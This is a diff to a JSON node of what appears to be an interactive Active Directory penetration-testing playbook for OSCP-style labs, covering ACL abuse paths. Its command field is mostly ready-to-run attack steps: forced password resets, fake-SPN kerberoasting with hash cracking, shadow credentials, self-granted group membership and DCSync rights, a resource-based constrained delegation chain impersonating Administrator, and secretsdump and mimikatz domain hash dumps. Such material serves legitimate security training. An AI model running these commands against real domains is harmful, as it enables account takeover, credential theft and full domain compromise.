@@ -1,22 +1,38 @@
 {
   "id": "acl_abuse",
   "phase": "AD",
-  "title": "ACL Abuse",
-  "body": "BloodHound showed you a misconfigured ACL. GenericAll, GenericWrite, WriteDACL, ForceChangePassword \u2014 all paths to escalation.",
-  "cmd": "# GenericAll over user \u2014 force password reset\nSet-DomainUserPassword -Identity targetuser \\\n  -AccountPassword (ConvertTo-SecureString 'Hack3d!23' -AsPlainText -Force)\n\n# GenericAll over group \u2014 add yourself\nAdd-DomainGroupMember -Identity 'Domain Admins' -Members 'youruser'\n\n# WriteDACL \u2014 grant yourself DCSync\nAdd-DomainObjectAcl \\\n  -TargetIdentity \"DC=domain,DC=com\" \\\n  -PrincipalIdentity youruser \\\n  -Rights DCSync\n\n# ForceChangePassword\ncred = New-Object System.Net.NetworkCredential(\"\",\"NewPass123!\")\nSet-DomainUserPassword -Identity target -AccountPassword cred.SecurePassword\n\n# DCSync once you have rights\n.\\mimikatz.exe \"privilege::debug\" \\\n  \"lsadump::dcsync /domain:domain.com /user:administrator\" \"exit\"",
-  "warn": null,
+  "title": "ACL Abuse — GenericAll, GenericWrite, WriteDACL, ForceChangePassword",
+  "body": "Active Directory ACL misconfigurations let low-privilege accounts take control of higher-privilege objects without any exploit. BloodHound surfaces these as edges — the label tells you exactly what you can do.\n\nThe four most common edges and what each means:\n\nGenericAll — full control of the object. On a user: reset password, add SPN (kerberoast), add to any group. On a group: add members. On a computer: RBCD attack. On a GPO: modify GPO settings (SharpGPOAbuse).\n\nGenericWrite — write to most attributes. On a user: add SPN (kerberoast), write logon script, shadow credentials. On a group: add members.\n\nWriteDACL — write the DACL. Grants yourself GenericAll first, then execute GenericAll path. One extra step but same result.\n\nForceChangePassword — reset a user's password without knowing the current one. Instant lateral move to that account.\n\nWriteOwner — take ownership of the object. Owner can then modify DACL → WriteDACL path.\n\nThe chain: BloodHound shows the edge → identify the object type (user/group/computer/GPO) → pick the right abuse technique for that edge+object combo.",
+  "cmd": "# ══════════════════════════════════════════════════\n# ENUMERATE — WHO HAS WHAT (PowerView)\n# ══════════════════════════════════════════════════\npowershell -ep bypass\nImport-Module .\\PowerView.ps1\n\n# What can my current user do?\nGet-DomainObjectAcl -Identity <target-user-or-group> -ResolveGUIDs | Where-Object {\n    $_.SecurityIdentifier -match '<your-user-SID>'\n} | Select ActiveDirectoryRights, ObjectDN\n\n# Find ALL interesting ACEs in the domain:\nFind-InterestingDomainAcl -ResolveGUIDs | Where-Object {\n    $_.IdentityReferenceName -match '<your-user>'\n}\n\n# Get your SID:\n(Get-ADUser <your-user>).SID\n# or: [System.Security.Principal.WindowsIdentity]::GetCurrent().User\n\n# ══════════════════════════════════════════════════\n# FORCECHANGEPASSWORD — reset target user password\n# ══════════════════════════════════════════════════\n$pass = ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force\nSet-DomainUserPassword -Identity <target-user> -AccountPassword $pass\n# Then log in with new password:\nevil-winrm -i <machine> -u <target-user> -p 'NewPass123!'\n\n# With explicit creds (if running as different account):\n$cred = New-Object System.Management.Automation.PSCredential('<domain>\\<your-user>', (ConvertTo-SecureString '<your-pass>' -AsPlainText -Force))\nSet-DomainUserPassword -Identity <target-user> -AccountPassword $pass -Credential $cred\n\n# Or net rpc (from Kali):\nnet rpc password <target-user> 'NewPass123!' -U '<domain>/<your-user>%<your-pass>' -S <dc-ip>\n\n# ══════════════════════════════════════════════════\n# GENERICWRITE ON USER — Add SPN → Kerberoast\n# ══════════════════════════════════════════════════\n# Set a fake SPN on the target user:\nSet-DomainObject -Identity <target-user> -Set @{serviceprincipalname='fake/BLAH'}\n# Now kerberoast them:\nGet-DomainSPNTicket -Identity <target-user> | Export-Csv -NoTypeInformation spn.csv\n# Or from Kali:\nimpacket-GetUserSPNs <domain>/<your-user>:'<pass>' -dc-ip <dc-ip> -request\n# Crack the TGS: hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt\n# Clean up after:\nSet-DomainObject -Identity <target-user> -Clear serviceprincipalname\n\n# ══════════════════════════════════════════════════\n# GENERICWRITE ON USER — Shadow Credentials\n# ══════════════════════════════════════════════════\n# (requires ADCS or MS-PKINIT — check if DC has a cert)\n# Add a KeyCredential (shadow cert) to target:\n# Whisker from Windows:\n.\\Whisker.exe add /target:<target-user>\n# This outputs a Rubeus command — run it to get a TGT as target user\n# Or from Kali:\npywhisker -d <domain> -u <your-user> -p '<pass>' --target <target-user> --action add\n\n# ══════════════════════════════════════════════════\n# GENERICWRITE ON GROUP — Add member\n# ══════════════════════════════════════════════════\nAdd-DomainGroupMember -Identity '<target-group>' -Members '<your-user>'\n# Verify:\nGet-DomainGroupMember '<target-group>'\n# Now reload your token (log off/on or new evil-winrm session):\nevil-winrm -i <machine> -u <your-user> -p '<pass>'\n\n# ══════════════════════════════════════════════════\n# WRITEDACL — Grant yourself GenericAll, then proceed\n# ══════════════════════════════════════════════════\n$cred = New-Object System.Management.Automation.PSCredential('<domain>\\<your-user>', (ConvertTo-SecureString '<your-pass>' -AsPlainText -Force))\nAdd-DomainObjectAcl -TargetIdentity '<target>' -PrincipalIdentity '<your-user>' -Rights All -Credential $cred\n# Now you have GenericAll — proceed with GenericAll path above\n# Clean up:\nRemove-DomainObjectAcl -TargetIdentity '<target>' -PrincipalIdentity '<your-user>' -Rights All\n\n# ══════════════════════════════════════════════════\n# GENERICALL ON COMPUTER — RBCD Attack\n# ══════════════════════════════════════════════════\n# Step 1: Create a machine account you control:\nimpacket-addcomputer <domain>/<your-user>:'<pass>' -dc-ip <dc-ip> -computer-name 'EVIL$' -computer-pass 'EvilPass123!'\n# Step 2: Set msDS-AllowedToActOnBehalfOfOtherIdentity on target:\nSet-DomainObject -Identity <target-computer> -Set @{'msds-allowedtoactonbehalfofotheridentity'=([System.Security.Principal.SecurityIdentifier](Get-DomainComputer 'EVIL$').objectsid).GetBinaryForm()}\n# Step 3: Get TGS as admin on target:\nimpacket-getST <domain>/'EVIL$':'EvilPass123!' -spn cifs/<target-computer>.<domain> -impersonate Administrator -dc-ip <dc-ip>\nexport KRB5CCNAME=Administrator.ccache\nimpacket-psexec -k -no-pass <domain>/Administrator@<target-computer>.<domain>\n\n# ══════════════════════════════════════════════════\n# DCSYNC — if you have Replicating Directory Changes on domain root\n# ══════════════════════════════════════════════════\n# Grant DCSync rights:\nAdd-DomainObjectAcl -TargetIdentity '<domain-DN>' -PrincipalIdentity '<your-user>' -Rights DCSync\n# Execute from Kali:\nimpacket-secretsdump <domain>/<your-user>:'<pass>'@<dc-ip>\n# Or mimikatz:\n# lsadump::dcsync /domain:<domain> /user:Administrator\n# lsadump::dcsync /domain:<domain> /user:krbtgt",
+  "warn": "Always identify the OBJECT TYPE the edge points to before choosing a technique — GenericWrite on a User, Group, Computer, and GPO each have different abuse paths. Check BloodHound's built-in abuse info for each edge (click the edge → Info tab) for the exact steps. After abusing ForceChangePassword or adding group members, the changed state persists in AD until someone fixes it — on a real engagement document and clean up. On OSCP labs cleanup is not required but it's good practice.",
   "choices": [
     {
-      "label": "Got DA hash via DCSync",
+      "label": "ForceChangePassword → got new creds",
+      "next": "creds_found"
+    },
+    {
+      "label": "Kerberoasted via GenericWrite SPN → crack hash",
+      "next": "kerberoast"
+    },
+    {
+      "label": "Added self to group → re-enumerate with new privileges",
+      "next": "bloodhound_authenticated"
+    },
+    {
+      "label": "WriteDACL → granted GenericAll → proceed",
+      "next": "acl_abuse"
+    },
+    {
+      "label": "DCSync rights → dump domain hashes",
       "next": "dcsync"
     },
     {
-      "label": "Added self to Domain Admins \u2014 lateral move",
+      "label": "RBCD attack → PSExec as admin",
       "next": "lateral_movement"
     },
     {
-      "label": "Reader can read LAPS \u2014 pull local admin",
-      "next": "laps_read"
+      "label": "Back to AD",
+      "next": "ad_start"
     }
   ]
 }
